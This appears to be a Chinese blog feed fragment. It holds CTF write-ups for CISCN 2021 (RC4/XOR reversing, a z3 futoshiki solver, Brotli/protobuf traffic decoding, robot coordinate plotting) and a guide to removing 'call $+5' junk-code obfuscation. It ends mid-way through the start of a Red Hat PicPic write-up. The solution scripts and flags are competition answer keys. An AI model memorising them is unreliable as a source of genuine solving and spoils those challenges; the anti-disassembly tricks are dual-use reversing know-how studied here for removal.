        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】2021CISCN初赛</title>
      <link href="p/wpFor-2021CISCNprelude/"/>
      <url>p/wpFor-2021CISCNprelude/</url>
      
        <content type="html"><![CDATA[<p>上周末打的CISCN初赛，发现没整理wp来火速补上。</p><p>这次RE属实拉跨，就做了俩签到题，做完就去摸MISC了，冲刺卷还能摸出个robot是我没想到的。（以及想看零解HMI的wp，翻了半天没翻到check我可好奇死了x</p><a id="more"></a><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="glass"><a href="#glass" class="headerlink" title="glass"></a>glass</h2><p>说签到真的是签到题</p><p>用JEB看java层发现是直接调用so的，那直接apktool解压然后去逆so文件</p><p>显而易见的前两个函数是RC4相关（还以为会魔改&#x3D; &#x3D;，第三个函数是一个自定义加密函数</p><p><img src="/p/wpFor-2021CISCNprelude/image-20210516100933175.png"></p><p>密文在<code>unk_497C</code>，长度0x27，先还原encrypt之前的数组，然后进行RC4解密（写了一些注释在代码里</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 还原encrypt前的数据</span></span><br><span class="line">arr=[<span class="number">0xA3</span>, <span class="number">0x1A</span>, <span class="number">0xE3</span>, <span class="number">0x69</span>, <span class="number">0x2F</span>, <span class="number">0xBB</span>, <span class="number">0x1A</span>, <span class="number">0x84</span>, <span class="number">0x65</span>, <span class="number">0xC2</span>, <span class="number">0xAD</span>, <span class="number">0xAD</span>, <span class="number">0x9E</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x02</span>, <span class="number">0x1F</span>, <span class="number">0x8E</span>, <span class="number">0x36</span>, <span class="number">0x4F</span>, <span class="number">0xE1</span>, <span class="number">0xEB</span>, <span class="number">0xAF</span>, <span class="number">0xF0</span>, <span class="number">0xEA</span>, <span class="number">0xC4</span>, <span class="number">0xA8</span>, <span class="number">0x2D</span>, <span class="number">0x42</span>, <span class="number">0xC7</span>, <span class="number">0x6E</span>, <span class="number">0x3F</span>, <span class="number">0xB0</span>, <span class="number">0xD3</span>, <span class="number">0xCC</span>, <span class="number">0x78</span>, <span class="number">0xF9</span>, <span class="number">0x98</span>, <span class="number">0x3F</span>]</span><br><span class="line">key=<span class="string">b&quot;12345678&quot;</span></span><br><span class="line">pos=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">39</span>,<span class="number">8</span>): <span class="comment">#第一部分逐字节xor 根据xor的特性直接把加密方法照搬</span></span><br><span class="line">    k=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> k!=<span class="number">8</span> <span class="keyword">and</span> j+k&lt;<span class="number">39</span>:</span><br><span class="line">        arr[pos+k]^=key[k]</span><br><span class="line">        k+=<span class="number">1</span></span><br><span class="line">    pos+=<span class="number">8</span></span><br><span class="line">l=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">39</span>,<span class="number">3</span>): <span class="comment">#第二部分乱七八糟的xor 直接拿已知数组copy了一下加密流程试出对应关系</span></span><br><span class="line">    l+=[arr[i+<span class="number">1</span>]^arr[i+<span class="number">2</span>],arr[i]^arr[i+<span class="number">1</span>],arr[i]^arr[i+<span class="number">1</span>]^arr[i+<span class="number">2</span>]]</span><br><span class="line">data=<span class="built_in">bytes</span>(l)</span><br><span class="line"></span><br><span class="line"><span class="comment"># RC4加/解密</span></span><br><span class="line"><span class="keyword">from</span> arc4 <span class="keyword">import</span> ARC4</span><br><span class="line">rc4=ARC4(key)</span><br><span class="line">ans=rc4.encrypt(data)</span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure><p><strong>CISCN{6654d84617f627c88846c172e0f4d46c}</strong></p><h2 id="baby-bc"><a href="#baby-bc" class="headerlink" title="baby_bc"></a>baby_bc</h2><p><code>.bc</code>文件前不久某场比赛才接触过，直接走流程</p><p>先用<code>clang -c baby.bc -o baby.bc.o</code>（也可以<code>clang baby.bc -o baby</code>得到可执行文件），然后直接用ida逆<code>.o</code>文件</p><p>（是附件更新前做出来的，吐槽一句怎么更新附件以后还把符号表混淆了x</p><p><img src="/p/wpFor-2021CISCNprelude/image-20210516101906999.png"></p><p>前半个check是用输入填充地图&#x2F;棋盘，map空的部分填输入的ascii码-48，map有值的部分输入要为’0’。输入只能为0-5。</p><p>后半个check有四个部分，分别是同一行的数据各不相同、同一列的数据各不相同、col&#x3D;1时当前值&lt;下方的值&amp;&amp;col&#x3D;2时当前值&gt;下方的值、row&#x3D;1时当前值&gt;右方的值&amp;&amp;row&#x3D;2时当前值&lt;右方的值。</p><p>这个check规则不就是futoshiki吗hhh</p><blockquote><p>比赛的时候想在网上找脚本，但是没找到能用的，完全靠手推（。</p><p>赛后被队里师兄提醒说其实可以用z3约束求解，猛然想起好像确实能用做哦（傻了x），现在复盘的话不如来学着写z3做（</p><p>参考wp：<a href="https://blog.csdn.net/m0_46481239/article/details/116902608">【CISCN2021】第十四届全国大学生信息安全竞赛初赛-writeup</a></p></blockquote><p>写z3脚本有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">row=[<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>]</span><br><span class="line">col=[<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>]</span><br><span class="line">s=Solver()</span><br><span class="line">res=[[Int(<span class="string">&quot;x%d%d&quot;</span>%(i,j)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">s.add(res[<span class="number">2</span>][<span class="number">2</span>]==<span class="number">4</span>) <span class="comment">#原map中已知值</span></span><br><span class="line">s.add(res[<span class="number">3</span>][<span class="number">3</span>]==<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        s.add(res[i][j]&gt;=<span class="number">1</span>)</span><br><span class="line">        s.add(res[i][j]&lt;=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(j): <span class="comment">#同一行互不相等</span></span><br><span class="line">            s.add(res[i][j]!=res[i][k])</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(i): <span class="comment">#同一列互不相等</span></span><br><span class="line">            s.add(res[i][j]!=res[k][j])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>): <span class="comment">#row=1时当前值&gt;右方的值&amp;&amp;row=2时当前值&lt;右方的值</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> row[<span class="number">4</span>*i+j]==<span class="number">1</span>:</span><br><span class="line">            s.add(res[i][j]&gt;res[i][j+<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">elif</span> row[<span class="number">4</span>*i+j]==<span class="number">2</span>:</span><br><span class="line">            s.add(res[i][j]&lt;res[i][j+<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>): <span class="comment">#col=1时当前值&lt;下方的值&amp;&amp;col=2时当前值&gt;下方的值</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">if</span> col[<span class="number">5</span>*i+j]==<span class="number">1</span>:</span><br><span class="line">            s.add(res[i][j]&lt;res[i+<span class="number">1</span>][j])</span><br><span class="line">        <span class="keyword">elif</span> col[<span class="number">5</span>*i+j]==<span class="number">2</span>:</span><br><span class="line">            s.add(res[i][j]&gt;res[i+<span class="number">1</span>][j])</span><br><span class="line">ans=s.check()</span><br><span class="line"><span class="keyword">if</span> ans==sat:</span><br><span class="line">    <span class="comment"># print(s.model())</span></span><br><span class="line">    m=s.model()</span><br><span class="line">    flag=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">            flag.append(m[j].as_long())</span><br><span class="line">    flag=[x+<span class="number">0x30</span> <span class="keyword">for</span> x <span class="keyword">in</span> flag]</span><br><span class="line">    flag[<span class="number">12</span>]=<span class="number">0x30</span></span><br><span class="line">    flag[<span class="number">18</span>]=<span class="number">0x30</span></span><br><span class="line">    flag=<span class="built_in">bytes</span>(flag)</span><br><span class="line">    print(flag)</span><br><span class="line">    print(<span class="string">&quot;CISCN&#123;&quot;</span>+md5(flag).hexdigest()+<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2021CISCNprelude/image-20210523001814515.png"></p><p>输入是1425353142350212150442315，得到flag：</p><p><strong>CISCN{8a04b4597ad08b83211d3adfa1f61431}</strong></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="tiny-traffic"><a href="#tiny-traffic" class="headerlink" title="tiny_traffic"></a>tiny_traffic</h2><p>翻流量包的时候有看到get了secret文件，这种文件名立刻警觉，感觉是关键文件</p><p><img src="/p/wpFor-2021CISCNprelude/image-20210516084122970.png"></p><p>查看响应包21615，有一个Content-Encoding:br，查了一下是Brotli压缩的文本</p><p><img src="/p/wpFor-2021CISCNprelude/image-20210516085645834.png"></p><p><img src="/p/wpFor-2021CISCNprelude/image-20210516085726015.png"></p><p>于是试图导出http对象，得到secret文件后解压缩发现解不出什么可见字符，于是逐个试了一遍没后缀名的文件解压，试出了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> brotli</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data=brotli.decompress(f.read())</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2021CISCNprelude/image-20210516090139546.png"></p><p>手动拆一下就是</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">PBResponse</span> </span>&#123;</span><br><span class="line">  <span class="built_in">int32</span> code = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">int64</span> flag_part_convert_to_hex_plz = <span class="number">2</span>;</span><br><span class="line">  <span class="class"><span class="keyword">message</span> <span class="title">data</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> junk_data = <span class="number">2</span>;</span><br><span class="line">    <span class="built_in">string</span> flag_part = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">repeated</span> data dataList = <span class="number">3</span>;</span><br><span class="line">  <span class="built_in">int32</span> flag_part_plz_convert_to_hex = <span class="number">4</span>;</span><br><span class="line">  <span class="built_in">string</span> flag_last_part = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">PBRequest</span> </span>&#123;</span><br><span class="line">  <span class="built_in">string</span> cate_id = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">int32</span> page = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">int32</span> pageSize = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查了一下proto3跟python的联动，找到了这篇文章，<a href="https://blog.csdn.net/menghaocheng/article/details/80176763%EF%BC%8C%E6%A0%BC%E5%BC%8F%E8%B7%9F%E9%9C%80%E6%B1%82%E9%83%BD%E4%B8%80%E6%A0%B7%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8C%89%E6%AD%A5%E9%AA%A4%E5%81%9A">https://blog.csdn.net/menghaocheng/article/details/80176763，格式跟需求都一样，直接按步骤做</a></p><p>写入protobuf处理脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> brotli</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data=brotli.decompress(f.read())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;../test.proto&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br></pre></td></tr></table></figure><p>运行<code>./protoc.exe --python_out=./ test.proto</code>得到<code>test_pb2.py</code></p><p>不知道先调哪个message于是两个都试了一下，最后exp是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> brotli</span><br><span class="line"><span class="keyword">import</span> test_pb2</span><br><span class="line"></span><br><span class="line">res=test_pb2.PBResponse()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;secret&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    s=brotli.decompress(f.read())</span><br><span class="line">    res.ParseFromString(s)</span><br><span class="line">    print(res)</span><br></pre></td></tr></table></figure><p>得到：</p><p><img src="/p/wpFor-2021CISCNprelude/image-20210516094843984.png"></p><p>于是再拼接一下变成flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">&quot;CISCN&#123;&quot;</span>+<span class="built_in">hex</span>(<span class="number">15100450</span>)[<span class="number">2</span>:]+<span class="string">&quot;e2345&quot;</span>+<span class="string">&quot;7889b0&quot;</span>+<span class="built_in">hex</span>(<span class="number">16453958</span>)[<span class="number">2</span>:]+<span class="string">&quot;d172a38dc&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>CISCN{e66a22e23457889b0fb1146d172a38dc}</strong></p><h2 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h2><blockquote><p>看了一眼别人的wp发现我这个好像非预期了&#x3D; &#x3D;</p></blockquote><p>依然是翻流量包，都是TCP协议包，于是直接追踪TCP流，能看到很明显的符合<code>r&quot;tgPos&#123;\d+&#125;\.Value\.\[\d+,\d+,-?\d+]&quot;</code>这种正则的字符串。</p><p>这种中括号形式就很像坐标，更何况这还是机器人绘制，肯定需要定位。</p><p>一开始以为是x,y,z这样分布，不过后来发现每个第三个值为-10的坐标点都是每个tgPos的最后一个，所以猜测第三个值是用来标定是否结束的。</p><p><img src="/p/wpFor-2021CISCNprelude/image-20210516095432497.png"></p><p>所以把这里追踪的结果全部复制下来，然后用python提取并画图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">x=[]</span><br><span class="line">y=[]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;tcp.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        ret=re.search(<span class="string">r&quot;tgPos&#123;\d+&#125;\.Value\.\[\d+,\d+,-?\d+]&quot;</span>,line) <span class="comment">#提取目标字符串</span></span><br><span class="line">        <span class="keyword">if</span> ret!=<span class="literal">None</span>:</span><br><span class="line">            s=ret.group()</span><br><span class="line">            idx1=s.find(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">            idx2=s.find(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            idx3=s.rfind(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            x.append(<span class="built_in">int</span>(s[idx1+<span class="number">1</span>:idx2]))</span><br><span class="line">            y.append(<span class="built_in">int</span>(s[idx2+<span class="number">1</span>:idx3]))</span><br><span class="line"></span><br><span class="line">plt.scatter(x,y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>可以得到图片：</p><p><img src="/p/wpFor-2021CISCNprelude/image.png"></p><p>垂直镜像处理一下就是：</p><p><img src="/p/wpFor-2021CISCNprelude/image-20210516100009114.png"></p><p>由<code>print(&quot;CISCN&#123;&quot;+md5(b&#39;easy_robo_xx&#39;).hexdigest()+&quot;&#125;&quot;)</code>得到flag：</p><p><strong>CISCN{d4f1fb80bc11ffd722861367747c0f10}</strong></p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> Misc </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RE套路 - 关于逆向常客花指令</title>
      <link href="p/reSkillsOn-ALLaboutJunkCode/"/>
      <url>p/reSkillsOn-ALLaboutJunkCode/</url>
      
        <content type="html"><![CDATA[<p>此文用来整理和分析做题过程中所遇到的那些花指令，必然持续更新。</p><p>关于花指令的介绍见：<a href="https://wizardforcel.gitbooks.io/re-for-beginners/content/Part-III/Chapter-50.html">花指令 · 逆向工程入门指南</a>，这里只总结例子啦~</p><a id="more"></a><h1 id="call-5模式"><a href="#call-5模式" class="headerlink" title="call $+5模式"></a>call $+5模式</h1><h2 id="2021-ISCC-擂台题-ZCM"><a href="#2021-ISCC-擂台题-ZCM" class="headerlink" title="[2021 ISCC] 擂台题-ZCM"></a>[2021 ISCC] 擂台题-ZCM</h2><p><img src="/p/reSkillsOn-ALLaboutJunkCode/image-20210518133843621.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...:00815023 038 E8 00 00 00 00          call    $+5</span><br><span class="line">...:00815028 03C 55                      push    ebp</span><br><span class="line">...:00815029 040 8B EC                   mov     ebp, esp</span><br><span class="line">...:0081502B                             db      36h</span><br><span class="line">...:0081502B 040 36 83 45 04 0A          add     dword ptr [ebp+4], 0Ah</span><br><span class="line">...:00815030 040 5D                      pop     ebp</span><br><span class="line">...:00815031 03C C3                      retn</span><br></pre></td></tr></table></figure><p>这一段可以完全等同于等同长度字节的nop，但是却能干扰IDA的反编译器。</p><p>首先我们知道：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call addr ;将返回地址（即call的下一条指令首地址）压入栈中，等同于：push 下一条指令的首地址; mov ip,addr</span><br><span class="line">ret ;将栈顶地址作为返回地址进行跳转，等同于pop ip</span><br></pre></td></tr></table></figure><p>那么执行完前三条指令（到<code>0x0081502B</code>时）栈区分布大概是：</p><p><img src="/p/reSkillsOn-ALLaboutJunkCode/image-20210523005707645.png"></p><p>在本例中，<code>ret_addr=0x00815028</code>，而<code>add dword ptr [ebp+4], 0Ah</code>根据栈区分布可以很明显地知道<code>[ebp+4]就是ret_addr</code>，所以是<code>ret_addr+=0x0A</code>即<code>ret_addr=0x00815032</code>。</p><p>而<code>0x00815032</code>这个返回地址正是<code>ret</code>指令的下一条指令，也就是说这一整段<code>0x00815023-0x00815031</code>代码是完全无意义的，甚至没有破坏寄存器值，所以可以完全用相同长度的<code>nop</code>指令代替。</p><p><strong>[划重点] 去花方法：等同于相同长度的<code>nop</code>指令。</strong></p><h2 id="2021-CISCN总决赛-junk"><a href="#2021-CISCN总决赛-junk" class="headerlink" title="[2021 CISCN总决赛] junk"></a>[2021 CISCN总决赛] junk</h2><p><img src="/p/reSkillsOn-ALLaboutJunkCode/image-20210719083647706.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401641 018 E8 00 00 00 00          call    $+5</span><br><span class="line">.text:0000000000401646 020 48 83 04 24 06          add     [rsp+18h+var_18], 6</span><br><span class="line">.text:000000000040164B 020 C3                      retn</span><br></pre></td></tr></table></figure><p>由局部变量定义区可知<code>var_18=-0x18</code>，那么<code>0x401646</code>处的指令可以等同于<code>add [rsp], 6</code>，同理可知<code>call</code>时栈顶处仅新增了<code>ret_addr=0x401646</code>，而这条指令就是将栈顶处的值+6，即将<code>ret_addr+6=0x40164c</code>，正好是<code>retn</code>指令后的下一条指令，所以<code>0x401641-0x40164B</code>这段也可以全部<code>nop</code>掉。</p><p><strong>[划重点] 去花方法：等同于相同长度的<code>nop</code>指令。</strong></p><h2 id="2021-CISCN总决赛-junk-1"><a href="#2021-CISCN总决赛-junk-1" class="headerlink" title="[2021 CISCN总决赛] junk"></a>[2021 CISCN总决赛] junk</h2><p><img src="/p/reSkillsOn-ALLaboutJunkCode/image-20210719085637899.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040166F 018 49 C7 C0 0D 00 00 00    mov     r8, 0Dh</span><br><span class="line">.text:0000000000401676 018 E8 00 00 00 00          call    $+5</span><br><span class="line">.text:000000000040167B 020 41 59                   pop     r9</span><br><span class="line">.text:000000000040167D 018 4D 01 C1                add     r9, r8</span><br><span class="line">.text:0000000000401680 018 41 51                   push    r9</span><br><span class="line">.text:0000000000401682 020 C3                      retn</span><br><span class="line"></span><br><span class="line">.text:0000000000401683 48 89 EC                    mov     rsp, rbp</span><br><span class="line">.text:0000000000401686 5D                          pop     rbp</span><br><span class="line">.text:0000000000401687 C3                          retn</span><br></pre></td></tr></table></figure><p><code>pop r9; add r9, r8; push r9</code>这一段就是把栈顶值（即<code>ret_addr=0x40167B</code>）取出来以后自加<code>0x0D</code>，结果为<code>ret_addr=0x401688</code>，所以在下一步执行<code>retn</code>时返回地址设置成了<code>0x401688</code>，就会直接跳过下面三条指令跳到<code>0x401688</code>处。</p><p>这里有破坏寄存器<code>r8</code>和<code>r9</code>的值，所以patch的时候不能直接<code>nop</code>掉，要注意更改寄存器的值（当然如果这两个寄存器后面都没用到的话当我没说x 不过保险起见，建议还是补上最好）。</p><p><strong>[划重点] 去花方法：patch成以下指令，多于字节用<code>nop</code>填充。</strong></p>]]></content>
      
      
      <categories>
          
          <category> Skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> u5eful </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】2021红帽杯-PicPic</title>
      <link href="p/wpFor-2021RedHat-PicPic/"/>
      <url>p/wpFor-2021RedHat-PicPic/</url>
      
        <content type="html"><![CDATA[<p>记一道折腾了我大半天的题，今天红帽杯Misc的PicPic，最后六点多一点做出来了（比赛六点结束😭血亏323pt）。感觉做这个题的时候把所有关于fft代码实现的博客和加解密相关的论文都翻了个遍，短时间内应该不想再看到它了（</p><a id="more"></a><h1 id="challenge-1"><a href="#challenge-1" class="headerlink" title="challenge 1"></a>challenge 1</h1><p>题目里面可以看到是一个<code>challenge 1</code>的文件夹，和<code>next_challenge.rar</code>的加密压缩包，合理猜测是用challenge 1解出压缩包的密码。</p><p>很容易就能发现题目给的<code>create.py</code>就是生成<code>r</code>、<code>1.mkv</code>和<code>2.mkv</code>的源码，逻辑也很容易走：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapping</span>(<span class="params">data, down=<span class="number">0</span>, up=<span class="number">255</span>, tp=np.uint8</span>):</span></span><br><span class="line">    data_max = data.<span class="built_in">max</span>()</span><br><span class="line">    data_min = data.<span class="built_in">min</span>()</span><br><span class="line">    interval = data_max - data_min</span><br><span class="line">    new_interval = up - down</span><br><span class="line">    new_data = (data - data_min) * new_interval / interval + down</span><br><span class="line">    new_data = new_data.astype(tp)</span><br><span class="line">    <span class="keyword">return</span> new_data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 